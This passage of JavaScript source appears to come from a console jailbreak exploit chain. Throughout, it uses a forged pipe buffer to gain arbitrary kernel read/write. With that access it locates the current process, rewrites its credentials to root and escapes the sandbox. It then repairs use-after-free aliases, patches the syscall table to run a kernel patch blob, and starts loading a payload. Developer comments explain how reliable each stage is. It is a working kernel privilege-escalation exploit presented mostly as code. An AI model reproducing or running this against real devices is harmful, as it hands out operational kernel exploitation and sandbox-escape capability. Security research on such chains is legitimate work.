        check("pipebuf-written-master-struct-pipe", wrote, "");
        if (wrote) {
          for (var fd of [masterPipe[0], masterPipe[1], slavePipe[0], slavePipe[1]]) sc(SYS.fcntl, fd, F_SETFL, O_NONBLOCK);
          var kvBufAb = new ArrayBuffer(PIPEBUF_SIZEOF);
          var kvViewAb = new ArrayBuffer(0x40);
          chainKeepAlive.push(kvBufAb, kvViewAb);
          var kvBufAddr = bufAddr(kvBufAb),
            kvBufDv = new DataView(kvBufAb);
          var kvViewAddr = bufAddr(kvViewAb),
            kvViewDv = new DataView(kvViewAb);
          new Uint8Array(kvBufAb).fill(0);
          kvBufDv.setUint32(0x0c, PIPE_PAGE, true);
          kv = {
            flush: function () {
              sc(SYS.write, masterPipe[1], kvBufAddr, PIPEBUF_SIZEOF);
              sc(SYS.read, masterPipe[0], kvBufAddr, PIPEBUF_SIZEOF);
            },
            kread: function (dst, src, n) {
              put(kvBufDv, 0x10, src);
              kvBufDv.setUint32(0, n >>> 0, true);
              this.flush();
              return sc(SYS.read, slavePipe[0], dst, n).i32;
            },
            kwrite: function (dst, src, n) {
              put(kvBufDv, 0x10, dst);
              kvBufDv.setUint32(0, n >>> 0, true);
              this.flush();
              return sc(SYS.write, slavePipe[1], src, n).i32;
            },
            read8: function (a) {
              new Uint8Array(kvViewAb).fill(0);
              this.kread(kvViewAddr, a, 8);
              return new int64(kvViewDv.getUint32(0, true), kvViewDv.getUint32(4, true));
            }
          };
          mark("KERNELVIEW", "master=" + masterPipe + " slave=" + slavePipe);
          new Uint8Array(kvViewAb).fill(0);
          kv.kread(kvViewAddr, kernelBase, 0x10);
          var hdr = [];
          for (var _i13 = 0; _i13 < 16; ++_i13) hdr.push(kvViewDv.getUint8(_i13));
          mark("KV-READ", "kernel_base -> " + hdr.map(function (v) {
            return v.toString(16).padStart(2, "0");
          }).join(" "));
          var kvElfOk = check("kernelview-reads-kernel-elf-header", kvViewDv.getUint32(0, true) === 0x464c457f, "");
          var fpM2 = kv.read8(fdtOfiles.add32(masterPipe[0] * FILEDESCENT_SIZE));
          var fpS2 = kv.read8(fdtOfiles.add32(slavePipe[0] * FILEDESCENT_SIZE));
          var same = function (a, b) {
            return a && b && a.low >>> 0 === b.low >>> 0 && a.hi >>> 0 === b.hi >>> 0;
          };
          mark("KV-FGET", "master=" + fpM2 + " kread=" + mFp + " slave=" + fpS2 + " kread=" + sFp);
          var kvAgree = check("primitives-agree-pipes-struct-file", same(fpM2, mFp) && same(fpS2, sFp), "");
          if (!kvElfOk || !kvAgree) {
            // REPORT ONLY. Do NOT null kv and do NOT skip what
            // follows. By this point the pipebuf forge has already
            // been committed, and the code below -- nulling the
            // triplets' ip6po_rthdr and removing the aliased struct
            // file -- is exactly what lets the process exit without
            // panicking the kernel. Gating it on a failed view
            // turns a run that would have finished dirty-but-alive
            // into a guaranteed panic at exit. Four independent
            // reviewers caught this; it was my mistake.
            mark("KERNELVIEW-SUSPECT", "elf=" + (kvElfOk ? 1 : 0) + " agree=" + (kvAgree ? 1 : 0) + " -- repair still runs, later stages self-gate");
          }
          var kvwAb = new ArrayBuffer(0x10);
          chainKeepAlive.push(kvwAb);
          var kvwAddr = bufAddr(kvwAb),
            kvwDv = new DataView(kvwAb);
          // dump scratch: kvwAb is only 0x10, and the pipebuf read
          // needs 0x18. Separate buffers so the dump can never
          // overflow the one the kview accessors use.
          var dmpAb = new ArrayBuffer(0x20);
          chainKeepAlive.push(dmpAb);
          var dmpAddr = bufAddr(dmpAb),
            dmpDv = new DataView(dmpAb);
          var dmpU8 = new Uint8Array(dmpAb);
          var scanAbDump = new ArrayBuffer(0x80 * FILEDESCENT_SIZE);
          chainKeepAlive.push(scanAbDump);
          var scanAddrDump = bufAddr(scanAbDump);
          var scanDvDump = new DataView(scanAbDump);
          function kview(base) {
            return {
              getBInt: function (o) {
                return kv.read8(base.add32(o));
              },
              setBInt: function (o, v) {
                new Uint8Array(kvwAb).fill(0);
                put(kvwDv, 0, v);
                kv.kwrite(base.add32(o), kvwAddr, 8);
              },
              getInt32: function (o) {
                new Uint8Array(kvwAb).fill(0);
                kv.kread(kvwAddr, base.add32(o), 4);
                return kvwDv.getInt32(0, true);
              },
              setInt32: function (o, v) {
                new Uint8Array(kvwAb).fill(0);
                kvwDv.setInt32(0, v, true);
                kv.kwrite(base.add32(o), kvwAddr, 4);
              },
              setUint8: function (o, v) {
                new Uint8Array(kvwAb).fill(0);
                kvwDv.setUint8(0, v);
                kv.kwrite(base.add32(o), kvwAddr, 1);
              }
            };
          }
          var kptr2 = function (v) {
            return v && v.hi >>> 0 >= 0xffff0000;
          };
          var fget = function (fd) {
            return kv.read8(fdtOfiles.add32(fd * FILEDESCENT_SIZE));
          };
          function fput(fd, v) {
            new Uint8Array(kvwAb).fill(0);
            put(kvwDv, 0, v);
            kv.kwrite(fdtOfiles.add32(fd * FILEDESCENT_SIZE), kvwAddr, 8);
          }
          function fhold(fp) {
            var before = kview(fp).getInt32(0x28);
            if (before <= 0 || before > 0xffff) return {
              before,
              after: before
            };
            var after = before;
            for (var bump = 1; bump <= 4; ++bump) {
              kview(fp).setInt32(0x28, before + bump);
              after = kview(fp).getInt32(0x28);
              if (after > before && after >= 2) break;
            }
            return {
              before,
              after
            };
          }
          {
            var _held = [];
            var allOk = true;
            for (var _fd of [masterPipe[0], masterPipe[1], slavePipe[0], slavePipe[1]]) {
              var fp = fget(_fd);
              if (!kptr2(fp)) {
                allOk = false;
                _held.push(_fd + ":badfp");
                continue;
              }
              var _r3 = fhold(fp);
              if (!(_r3.after > _r3.before)) allOk = false;
              _held.push(_fd + ":" + _r3.before + "->" + _r3.after);
            }
            mark("PIPE-REFCNT", _held.join(" "));
            check("four-karw-pipe-files-hold", allOk, "");
          }

          // ITEM 1. Jailbreak BEFORE the teardown. The funnel was
          // KERNELVIEW 44 -> CURPROC 38: six runs had working
          // kernel R/W and died in cleanup without ever trying.
          // Everything below needs only kv, fdtOfiles and sc, all
          // live from here. poops.js:7273 orders it the same way.
          //
          // WRAPPED, and it has to be: running before the cleanup
          // means a throw in here would skip the socket close and
          // the alias repair and leave the console dirty. Running
          // last, it never could.
          var jailbreakThrew = null;
          // Declared OUT here: the kernel patcher and the
          // payload stage read both, and a let inside the try
          // below would be block-scoped away from them --
          // a runtime ReferenceError node --check cannot see.
          var jailbroken = false,
            curproc = null;
          try {
            var FIOSETOWN = 0x8004667c;
            var P_LIST_NEXT = 0x00,
              P_UCRED = 0x40,
              P_FD = 0x48,
              P_PID = 0xb0;
            var CR_UID = 0x04,
              CR_RUID = 0x08,
              CR_SVUID = 0x0c;
            var CR_NGROUPS = 0x10,
              CR_RGID = 0x14;
            var CR_PRISON = 0x30,
              CR_SCECAPS1 = 0x60,
              CR_SCECAPS0 = 0x68;
            var FD_RDIR = 0x10,
              FD_JDIR = 0x18;
            state("sandbox escape...", "warn");
            {
              if (sc(SYS.pipe, argAddr).i32 !== -1) {
                var escPipe = [argDv.getInt32(0, true), argDv.getInt32(4, true)];
                lenDv.setUint32(0, pid, true);
                sc(SYS.ioctl, escPipe[0], FIOSETOWN, lenAddr);
                var escFp = fget(escPipe[0]);
                var escData = kptr2(escFp) ? kv.read8(escFp) : null;
                var sigio = kptr2(escData) ? kv.read8(escData.add32(0xd0)) : null;
                curproc = kptr2(sigio) ? kv.read8(sigio) : null;
                sc(SYS.close, escPipe[1]);
                sc(SYS.close, escPipe[0]);
              }
              mark("CURPROC", "" + (curproc || "null"));
              check("curproc-resolved-through-pipe-sigio", kptr2(curproc), "" + (curproc || "null"));
            }
            if (kptr2(curproc)) {
              function pfind(target) {
                var q = kv.read8(curproc);
                for (var n = 0; n < 4096; ++n) {
                  if (!kptr2(q)) return null;
                  if (kview(q).getInt32(P_PID) === target) return q;
                  q = kv.read8(q.add32(P_LIST_NEXT));
                }
                return null;
              }
              var kProc = pfind(0);
              var procFd = kv.read8(curproc.add32(P_FD));
              var ucred = kv.read8(curproc.add32(P_UCRED));
              mark("JAILBREAK-SOURCES", "kproc=" + (kProc || "null") + " p_fd=" + procFd + " p_ucred=" + ucred);
              var prison0 = kptr2(kProc) ? kv.read8(kv.read8(kProc.add32(P_UCRED)).add32(CR_PRISON)) : null;
              var rootVnode = kptr2(kProc) ? kv.read8(kv.read8(kProc.add32(P_FD)).add32(FD_RDIR)) : null;
              var srcOk = kptr2(procFd) && kptr2(ucred) && kptr2(prison0) && kptr2(rootVnode);
              mark("JAILBREAK-KSRC", "prison0=" + (prison0 || "null") + " rootvnode=" + (rootVnode || "null"));
              if (check("jailbreak-source-kernel-pointer", srcOk, srcOk ? "" : "refusing to write")) {
                kview(ucred).setInt32(CR_UID, 0);
                kview(ucred).setInt32(CR_RUID, 0);
                kview(ucred).setInt32(CR_SVUID, 0);
                kview(ucred).setInt32(CR_NGROUPS, 1);
                kview(ucred).setInt32(CR_RGID, 0);
                kview(ucred).setBInt(CR_PRISON, prison0);
                kview(ucred).setBInt(CR_SCECAPS1, new int64(-1, -1));
                kview(ucred).setBInt(CR_SCECAPS0, new int64(-1, -1));
                kview(procFd).setBInt(FD_RDIR, rootVnode);
                kview(procFd).setBInt(FD_JDIR, rootVnode);
                var uidNow = sc(SYS.getuid).i32;
                jailbroken = uidNow === 0;
                mark("JAILBROKEN", "uid=" + uidNow + " prison0=" + kview(ucred).getBInt(CR_PRISON) + " fd_rdir=" + kview(procFd).getBInt(FD_RDIR));
                check("kernel-reports-root", jailbroken, "getuid=" + uidNow);
              }
            }
          } catch (e) {
            jailbreakThrew = e && e.message ? e.message : "" + e;
            mark("JAILBREAK-THREW", jailbreakThrew + " -- continuing to cleanup");
          }

          // Addresses captured during the repair so the end-of-run
          // dump can re-read them once the sockets are closed.
          var dumpOpts = [];
          function removeRthdrFromSocket(fd) {
            var fp = fget(fd);
            if (!kptr2(fp)) return "badfp";
            var fData = kv.read8(fp);
            if (!kptr2(fData)) return "badfdata";
            var soPcb = kv.read8(fData.add32(0x18));
            if (!kptr2(soPcb)) return "badpcb";
            var opts = kv.read8(soPcb.add32(0x118));
            if (kptr2(opts)) dumpOpts.push({
              fd: fd,
              opts: opts
            });
            if (!kptr2(opts)) return "noopts";
            // ITEM 4. Read it, write it, READ IT BACK. This is the
            // single write that decides whether the process can exit
            // without panicking, and until now nothing anywhere in
            // the chain has ever confirmed that a kv write actually
            // lands -- the check below reported "nulled" purely
            // because the four reads above looked pointer-shaped.
            // poops.js:7123-7128 reads back the same way.
            var was = kview(opts).getBInt(0x68);
            kview(opts).setBInt(0x68, new int64(0, 0));
            var now = kview(opts).getBInt(0x68);
            if (!now || now.low >>> 0 !== 0 || now.hi >>> 0 !== 0) {
              mark("RTHDR-NULL-FAILED", "fd=" + fd + " opts=" + opts + " was=" + was + " still=" + now);
              return "writefail";
            }
            return was && (was.low >>> 0 || was.hi >>> 0) ? "nulled" : "already0";
          }
          {
            var res = triplets.map(function (fd) {
              return fd + ":" + removeRthdrFromSocket(fd);
            });
            mark("TRIPLET-RTHDR", res.join(" "));
            // "already0" is a success: the field was already clear,
            // so there is nothing to repair. Only a failed WRITE or
            // a bad walk is a failure -- and unlike before, this now
            // reflects a verified read-back rather than the shape of
            // the pointers we walked to get here.
            check("triplet-ip6po_rthdr-nulled", res.every(function (r) {
              return r.endsWith("nulled") || r.endsWith("already0");
            }), res.join(" "));
          }

          // ITEM 6(c). The half that makes the retry safe. Every socket
          // burned during a failed attempt still has an rthdr pointing
          // at a freed ucred; closing it would free that chunk again.
          // Now that kernel R/W exists, null the pointer -- verified by
          // read-back -- and only then let it out of the burn list.
          // Anything that will not repair STAYS burned and stays open.
          if (burned.size) {
            var bres = [],
              cleared = [];
            for (var _fd2 of burned) {
              var _r4 = removeRthdrFromSocket(_fd2);
              bres.push(_fd2 + ":" + _r4);
              if (_r4 === "nulled" || _r4 === "already0") cleared.push(_fd2);
            }
            for (var _fd3 of cleared) burned.delete(_fd3);
            mark("BURNED-REPAIRED", bres.join(" ") + "  still_burned=" + burned.size);
            check("burned-sockets-repaired", burned.size === 0, burned.size ? [...burned].join(",") : "");
            if (burned.size) rebootRequired = true;
          }
          state("remove_uaf_file...", "warn");
          var uafFp = fget(uafSock);
          uafFpSaved = uafFp;
          mark("UAF-FP", "fd=" + uafSock + " fp=" + uafFp);
          if (kptr2(uafFp)) {
            var _r5 = fhold(uafFp);

            // THIS LOOP WAS KILLING 22% OF THE RUNS THAT REACHED IT.
            // 2048 x fget(), and every fget minted TWO int64 -- and
            // int64.js gives each instance its own seven closures
            // (int64.js:19-93), so 8 GC cells apiece -- plus a
            // per-call Uint8Array inside kv.read8, plus two pipe
            // syscalls. 34,816 objects and 4,096 syscalls in one
            // unbroken synchronous stretch, at the point the heap is
            // most loaded, with no yield anywhere in it. JSC's
            // sweeper only runs when the event loop turns, so all of
            // that garbage sat unswept until the await immediately
            // after SOCKETS-CLOSED -- which is exactly where the
            // process was being killed.
            //
            // Same range, same comparisons, same writes. The ofiles
            // array is just read in bulk and scanned as raw words in
            // the DataView: no int64, no typed array, no per-fd
            // syscall. Two syscalls per 512 fds instead of 1024.
            // Cleanup runs ~500 ms after the race, so the yields are
            // free here.
            // BOUNDED. This scan used to run to 0x800 with nothing
            // proving the ofiles array is that big. If the table is
            // smaller, the bulk read walks past the allocation and
            // any 8 bytes out there that happen to equal uafFp get
            // ZEROED by the fput below -- an out-of-bounds kernel
            // write whose damage surfaces at the NEXT allocation,
            // which is exactly the window where 22% of the runs
            // reaching here died. POOPS.LUA:1219 scans only 0..255;
            // we were eight times wider with no bound at all.
            //
            // Bound it by the highest fd we can PROVE is open,
            // because we are holding it -- the table must have at
            // least that many entries, and FreeBSD never shrinks it
            // on close. No fd_nfiles offset to get wrong. The
            // highest alias ever observed across 71 logged runs is
            // 273, and our own sockets run past that.
            var maxHeld = 0;
            for (var _fd4 of ipv6) if (_fd4 > maxHeld) maxHeld = _fd4;
            for (var _fd5 of [masterPipe[0], masterPipe[1], slavePipe[0], slavePipe[1], iovSs[0], iovSs[1], uioSs[0], uioSs[1], uafSock]) if (_fd5 > maxHeld) maxHeld = _fd5;
            var _SCAN_MAX = Math.min(0x800, maxHeld + 1);
            mark("UAF-SCAN-BOUND", "max_held_fd=" + maxHeld + " scan_max=" + _SCAN_MAX + " was=2048");
            // CLAMPED, and it has to be. This value is the loop
            // INCREMENT at the bottom of this block, not a bound, so
            // unlike every other knob in this file a bad value does
            // not degrade to "do nothing" -- it never terminates.
            // parseInt("0x200", 10) is 0 (it stops at the x), and
            // 0x200 is exactly how the default is spelled right
            // here, so that is the value someone is most likely to
            // paste in. A non-terminating loop here awaits a 0 ms
            // timer forever: the finally never runs, the main thread
            // stays realtime-pinned, the freed file stays aliased,
            // and the console needs a hard power-off.
            // Upper bound: CHUNK_BYTES must stay strictly under
            // PIPE_PAGE, or pipe_read wraps its buffer and hands
            // back DUPLICATED data that still passes the
            // rv === CHUNK_BYTES check -- which would make fput()
            // write zeros far past the end of the fd table.
            var CHUNK_FDS = function () {
              var cap = PIPE_PAGE / FILEDESCENT_SIZE >> 1;
              var n = params.has("scanchunk") ? parseInt(params.get("scanchunk"), 10) : 0x200;
              if ((n | 0) === n && n >= 1 && n <= cap) return n;
              if (params.has("scanchunk")) mark("SCANCHUNK-CLAMPED", "given=" + params.get("scanchunk") + " cap=" + cap + " using=0x200");
              return 0x200;
            }();
            var CHUNK_BYTES = CHUNK_FDS * FILEDESCENT_SIZE;
            var scanAb = new ArrayBuffer(CHUNK_BYTES);
            chainKeepAlive.push(scanAb); // its address goes to the kernel
            var scanAddr = bufAddr(scanAb);
            var scanDv = new DataView(scanAb);
            var wantLo = uafFp.low >>> 0,
              wantHi = uafFp.hi >>> 0;
            var nulled = 0,
              bulkChunks = 0,
              slowChunks = 0;
            var fds = [];
            for (var base = 0; base < _SCAN_MAX; base += CHUNK_FDS) {
              // Clamp the LAST chunk. SCAN_MAX is now a measured
              // bound, not a round number, so a fixed-size read
              // here would walk past the table on the final chunk
              // -- reintroducing the exact out-of-bounds this
              // bound exists to prevent.
              var nFds = Math.min(CHUNK_FDS, _SCAN_MAX - base);
              var nBytes = nFds * FILEDESCENT_SIZE;
              var rv = kv.kread(scanAddr, fdtOfiles.add32(base * FILEDESCENT_SIZE), nBytes);
              if (rv === nBytes) {
                bulkChunks++;
                for (var _i14 = 0; _i14 < nFds; ++_i14) {
                  var _o2 = _i14 * FILEDESCENT_SIZE;
                  if (scanDv.getUint32(_o2, true) === wantLo && scanDv.getUint32(_o2 + 4, true) === wantHi) {
                    var _fd6 = base + _i14;
                    fput(_fd6, new int64(0, 0));
                    nulled++;
                    fds.push(_fd6);
                  }
                }
              } else {
                // Short read: redo THIS CHUNK the original way.
                // Never skip one -- a missed alias leaves the
                // console dirty and costs a reboot, which is far
                // worse than the allocation we are avoiding.
                slowChunks++;
                for (var _i15 = 0; _i15 < nFds; ++_i15) {
                  var _fd7 = base + _i15;
                  if (same(fget(_fd7), uafFp)) {
                    fput(_fd7, new int64(0, 0));
                    nulled++;
                    fds.push(_fd7);
                  }
                }
              }
              // Let the sweeper run. This is the whole point.
              await new Promise(function (done) {
                return setTimeout(done, 0);
              });
            }
            mark("UAF-SCAN", "chunks=" + CHUNK_FDS + "fd bulk=" + bulkChunks + " fellback=" + slowChunks + " syscalls=" + (bulkChunks * 2 + slowChunks * CHUNK_FDS * 2));
            uafSock = 0;

            // ================== P1: DRAIN THE FILE ZONE ==================
            // MEASURED, not assumed. A 256-allocation probe returned
            // the SAME struct file at three consecutive fds
            // (364,365,366): the chunk is linked into the Files zone
            // free list THREE times -- freed 3x (CLEAR_QUEUE and two
            // dup+close) but allocated once -- so falloc hands the
            // identical object to three independent owners. The first
            // to close it frees it; the other two dangle. That is the
            // panic minutes after an idle run.
            //
            // The fd-table scan above cannot see this: a free-list
            // entry is in no fd table. Pull the duplicates out by
            // allocating until they surface (~1032 deep, stride 0x68).
            //
            // NULL the slot; do NOT leak the fd. f_count reads 1, not
            // 3 -- each falloc resets it -- so three descriptors point
            // at an object whose refcount says one, and leaking them
            // only moves the panic to fdescfree at process exit.
            // Nulling means nothing references it and it is orphaned
            // for good. netctrl_c0w_twins.ts:1332 nulls before close
            // for exactly this reason.
            var DRAIN_CAP = function () {
              var n = params.has("drain") ? parseInt(params.get("drain"), 10) : 1536;
              return (n | 0) === n && n >= 0 && n <= 8192 ? n : 1536;
            }();
            var DRAIN_EXPECT = 3,
              DRAIN_BATCH = 128;
            // Visible to the `clean` decision below. Default true so
            // that ?drain=0 does not by itself condemn the run.
            var zoneClean = true;
            if (DRAIN_CAP > 0) {
              var dAb = new ArrayBuffer(DRAIN_BATCH * FILEDESCENT_SIZE);
              chainKeepAlive.push(dAb);
              var dAddr = bufAddr(dAb),
                dDv = new DataView(dAb);
              var oneAb = new ArrayBuffer(8);
              chainKeepAlive.push(oneAb);
              var oneAddr = bufAddr(oneAb),
                oneDv = new DataView(oneAb);
              var wLo = uafFp.low >>> 0,
                wHi = uafFp.hi >>> 0;
              var _held2 = [],
                hitFds = [];
              var _scanned = 0,
                batches = 0,
                moved = 0,
                emfile = false;
              // The fd table REALLOCATES as it grows, so the cached
              // fdtOfiles goes stale mid-drain and both fget and fput
              // would then touch freed memory. Re-read it each batch
              // and use the fresh pointer for reads AND writes.
              var ofl = fdtOfiles;
              var dl = Date.now() + 15000;
              while (_scanned < DRAIN_CAP && hitFds.length < DRAIN_EXPECT && Date.now() < dl) {
                var batch = [];
                for (var _i16 = 0; _i16 < DRAIN_BATCH && _scanned < DRAIN_CAP; ++_i16) {
                  var _fd8 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                  if (_fd8 === -1) {
                    emfile = true;
                    break;
                  }
                  batch.push(_fd8);
                  _held2.push(_fd8);
                  _scanned++;
                }
                if (!batch.length) break;
                batches++;
                var fresh = kv.read8(kqFdp);
                if (kptr2(fresh) && !(fresh.low === ofl.low && fresh.hi === ofl.hi)) {
                  ofl = fresh;
                  moved++;
                }
                var lo = batch[0],
                  hi = batch[batch.length - 1];
                var _span = (hi - lo + 1) * FILEDESCENT_SIZE;
                var bulk = false;
                if (_span > 0 && _span <= dAb.byteLength) {
                  bulk = kv.kread(dAddr, ofl.add32(lo * FILEDESCENT_SIZE), _span) === _span;
                }
                for (var _fd9 of batch) {
                  var flo = void 0,
                    fhi = void 0;
                  if (bulk) {
                    var _o3 = (_fd9 - lo) * FILEDESCENT_SIZE;
                    flo = dDv.getUint32(_o3, true) >>> 0;
                    fhi = dDv.getUint32(_o3 + 4, true) >>> 0;
                  } else {
                    if (kv.kread(oneAddr, ofl.add32(_fd9 * FILEDESCENT_SIZE), 8) !== 8) continue;
                    flo = oneDv.getUint32(0, true) >>> 0;
                    fhi = oneDv.getUint32(4, true) >>> 0;
                  }
                  if (flo === wLo && fhi === wHi) hitFds.push(_fd9);
                }
                await new Promise(function (done) {
                  return setTimeout(done, 0);
                });
              }
              // NULL every hit through the CURRENT ofiles, then close.
              // close() on a nulled slot is a no-op, so nothing frees.
              var nulledHits = 0;
              for (var _fd0 of hitFds) {
                oneDv.setUint32(0, 0, true);
                oneDv.setUint32(4, 0, true);
                kv.kwrite(ofl.add32(_fd0 * FILEDESCENT_SIZE), oneAddr, 8);
                if (kv.kread(oneAddr, ofl.add32(_fd0 * FILEDESCENT_SIZE), 8) === 8 && oneDv.getUint32(0, true) === 0 && oneDv.getUint32(4, true) === 0) nulledHits++;
                sc(SYS.close, _fd0);
              }
              for (var _fd1 of _held2) if (hitFds.indexOf(_fd1) < 0) sc(SYS.close, _fd1);
              mark("ZONE-DRAIN", "scanned=" + _scanned + "/" + DRAIN_CAP + " batches=" + batches + " hits=" + hitFds.length + "/" + DRAIN_EXPECT + (hitFds.length ? " at_fds=" + hitFds.join(",") : "") + " nulled=" + nulledHits + " ofiles_moved=" + moved + (emfile ? " EMFILE" : ""));
              check("file-zone-duplicates-drained", hitFds.length === DRAIN_EXPECT && nulledHits === hitFds.length, "found " + hitFds.length + " of " + DRAIN_EXPECT + ", nulled " + nulledHits);
              if (hitFds.length !== DRAIN_EXPECT || nulledHits !== hitFds.length) {
                rebootRequired = true;
                zoneClean = false;
              }

              // Independent verification: fresh allocations must no
              // longer be handed the chunk. This is the measurement
              // that says the console is actually clean.
              var vfds = [];
              var vhits = 0;
              for (var _i17 = 0; _i17 < 16; ++_i17) {
                var _fd10 = sc(SYS.socket, AF_UNIX, SOCK_STREAM, 0).i32;
                if (_fd10 === -1) break;
                vfds.push(_fd10);
              }
              var vres = kv.read8(kqFdp);
              var vofl = kptr2(vres) ? vres : ofl;
              for (var _fd11 of vfds) {
                if (kv.kread(oneAddr, vofl.add32(_fd11 * FILEDESCENT_SIZE), 8) !== 8) {
                  sc(SYS.close, _fd11);
                  continue;
                }
                if (oneDv.getUint32(0, true) >>> 0 === wLo && oneDv.getUint32(4, true) >>> 0 === wHi) {
                  vhits++;
                  oneDv.setUint32(0, 0, true);
                  oneDv.setUint32(4, 0, true);
                  kv.kwrite(vofl.add32(_fd11 * FILEDESCENT_SIZE), oneAddr, 8);
                }
                sc(SYS.close, _fd11);
              }
              mark("ZONE-VERIFY", "alloc=" + vfds.length + " residual_hits=" + vhits);
              check("freed-file-not-reissued-by-falloc", vhits === 0, vhits ? "still reissued after the drain" : "");
              if (vhits) {
                rebootRequired = true;
                zoneClean = false;
              }
            }
            // ================ END P1: DRAIN THE FILE ZONE ================

            mark("UAF-REMOVED", "fhold=" + _r5.before + "->" + _r5.after + " nulled=" + nulled + "/" + _SCAN_MAX + " fds=" + fds.join(","));
            // `nulled > 0` only ever proved the LIVE FD TABLE was
            // tidy. It is structurally blind to a free-list entry,
            // and every "clean" run we celebrated was reporting on
            // that blind evidence -- which is why the console kept
            // panicking minutes later. A run is clean only if the fd
            // table was repaired AND the zone drain removed every
            // duplicate AND fresh allocations no longer see it.
            check("alias-freed-file-nulled", nulled > 0, "nulled=" + nulled);
            var clean = nulled > 0 && zoneClean;
            if (clean) rebootRequired = false;else mark("STILL-DIRTY", "reboot=1 fdtable=" + (nulled > 0 ? "ok" : "FAILED") + " zone=" + (zoneClean ? "ok" : "FAILED"));
          } else {
            check("uaf_sock-struct-file-readable", false, "fp=" + uafFp);
          }
          {
            var closed = 0,
              heldBack = 0;
            for (var _fd12 of ipv6) {
              // ITEM 6(c). A still-burned socket owns an rthdr over
              // freed memory; close() would free it a second time.
              // Leaking the fd costs nothing, freeing it panics.
              if (burned.has(_fd12)) {
                heldBack++;
                continue;
              }
              if (sc(SYS.close, _fd12).i32 === 0) closed++;
            }
            for (var _fd13 of [iovSs[0], iovSs[1], uioSs[0], uioSs[1]]) if (sc(SYS.close, _fd13).i32 === 0) closed++;
            mark("SOCKETS-CLOSED", "n=" + closed + "/" + (ipv6.length + 4) + (heldBack ? "  held_back_burned=" + heldBack : ""));
          }
          await restoreThreadAttrs("cleanup");
          var kpatched = false;
          if (jailbroken && kpatch && KPATCH_JMP_SITES.length >= 4) {
            state("kernel patches...", "warn");
            var SYSENT_NARG = 0,
              SYSENT_CALL = 8,
              SYSENT_THRCNT = 0x2c;
            var sysent = kernelBase.add32(off.k_sysent_661);
            var gadget = kernelBase.add32(off.k_jmp_rsi);
            var gb = [];
            for (var _i18 = 0; _i18 < 4; ++_i18) {
              new Uint8Array(kvwAb).fill(0);
              kv.kread(kvwAddr, gadget.add32(_i18), 1);
              gb.push(kvwDv.getUint8(0));
            }
            mark("JMP-RSI-BYTES", gadget + " -> " + gb.map(function (v) {
              return v.toString(16).padStart(2, "0");
            }).join(" "));
            var gadgetOk = gb[0] === 0xff && gb[1] === 0x26;
            var oNarg = kview(sysent).getInt32(SYSENT_NARG);
            var oCall = kview(sysent).getBInt(SYSENT_CALL);
            var oThr = kview(sysent).getInt32(SYSENT_THRCNT);
            mark("SYSENT-661", "narg=" + oNarg + " thrcnt=" + oThr + " sy_call=" + oCall);
            var sysentOk = oNarg >= 0 && oNarg <= 8 && kptr2(oCall);
            var siteBytes = [];
            var sitesOk = true;
            for (var _s of KPATCH_JMP_SITES) {
              new Uint8Array(kvwAb).fill(0);
              kv.kread(kvwAddr, kernelBase.add32(_s), 1);
              var _b = kvwDv.getUint8(0);
              siteBytes.push(hx(_s) + ":" + _b.toString(16));
              if (!(_b >= 0x70 && _b <= 0x7f || _b === 0xeb)) sitesOk = false;
            }
            mark("KPATCH-SITES", siteBytes.join(" "));
            check("gadget-sysent661-patch-sites-look-right", gadgetOk && sysentOk && sitesOk, "gadget=" + gadgetOk + " sysent=" + sysentOk + " sites=" + sitesOk);
            if (gadgetOk && sysentOk && sitesOk) {
              var jitFd = sc(SYS.jitshm_create, 0, 0x4000, 7).i32;
              var KEXEC_MAP = new int64(0x20100000, 9);
              var mapped = sc(SYS.mmap, KEXEC_MAP, 0x4000, 7, 0x11, jitFd, 0);
              var mapAddr = new int64(mapped.lo, mapped.hi);
              mark("KPATCH-MAP", "jitshm_create=" + jitFd + " mmap=" + mapAddr);
              if (mapAddr.hi > 0) {
                for (var _i19 = 0; _i19 < kpatch.length; ++_i19) p.write1(mapAddr.add32(_i19), kpatch[_i19]);
                var copied = true;
                for (var _i20 = 0; _i20 < kpatch.length; ++_i20) if (p.read1(mapAddr.add32(_i20)) !== kpatch[_i20]) {
                  copied = false;
                  break;
                }
                check("blob-rwx-memory-byte-byte", copied, kpatch.length + " bytes");
                if (copied) {
                  kview(sysent).setInt32(SYSENT_NARG, 2);
                  kview(sysent).setBInt(SYSENT_CALL, gadget);
                  kview(sysent).setInt32(SYSENT_THRCNT, 1);
                  var armedOk = same(kview(sysent).getBInt(SYSENT_CALL), gadget);
                  mark("SYSENT-ARMED", "sy_call=" + gadget + (armedOk ? "" : " MISMATCH"));
                  if (armedOk) {
                    // ITEM 5b. sysent[661] is now pointing at
                    // a jmp [rsi] gadget SYSTEM-WIDE. If
                    // anything between here and the restore
                    // throws, every process on the console is
                    // left with a weaponised syscall 661 --
                    // and the outer finally does not cover
                    // this, because it is nested inside the
                    // KernelView block. Restore in a finally.
                    var rc = -1;
                    try {
                      rc = sc(SYS.kexec, mapAddr).i32;
                    } finally {
                      kview(sysent).setInt32(SYSENT_NARG, oNarg);
                      kview(sysent).setBInt(SYSENT_CALL, oCall);
                      kview(sysent).setInt32(SYSENT_THRCNT, oThr);
                      var back = same(kview(sysent).getBInt(SYSENT_CALL), oCall);
                      if (!back) mark("SYSENT-NOT-RESTORED", "sy_call still " + kview(sysent).getBInt(SYSENT_CALL) + " -- syscall 661 is armed system-wide");
                    }
                    var verify = [];
                    var allEb = true;
                    for (var _s2 of KPATCH_JMP_SITES) {
                      new Uint8Array(kvwAb).fill(0);
                      kv.kread(kvwAddr, kernelBase.add32(_s2), 1);
                      var _b2 = kvwDv.getUint8(0);
                      verify.push(hx(_s2) + ":" + _b2.toString(16));
                      if (_b2 !== 0xeb) allEb = false;
                    }
                    mark("KEXEC", "arg=" + mapAddr + " rc=" + rc + " sysent=restored");
                    mark("KPATCH-VERIFY", verify.join(" "));
                    kpatched = rc === 0 && allEb;
                    check("gated-site-reads-0xeb", allEb, "");
                    check("blob-ran-ring-0", rc === 0, "kexec=" + rc);
                    if (kpatched) mark("KERNEL-PATCHED", "sites=" + KPATCH_JMP_SITES.length);
                  }
                }
              }
            }
          } else if (jailbroken) {
            mark("KPATCH-SKIPPED", "blob=" + (kpatch ? kpatch.length : 0) + " sites=" + KPATCH_JMP_SITES.length);
          }
          var payloadRunning = false;
          if (payload && (kpatched || params.get("payload") === "1") && params.get("payload") !== "0") {
            state("payload...", "warn");
            var sz = payload.length + 0x3fff & ~0x3fff;
            var m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
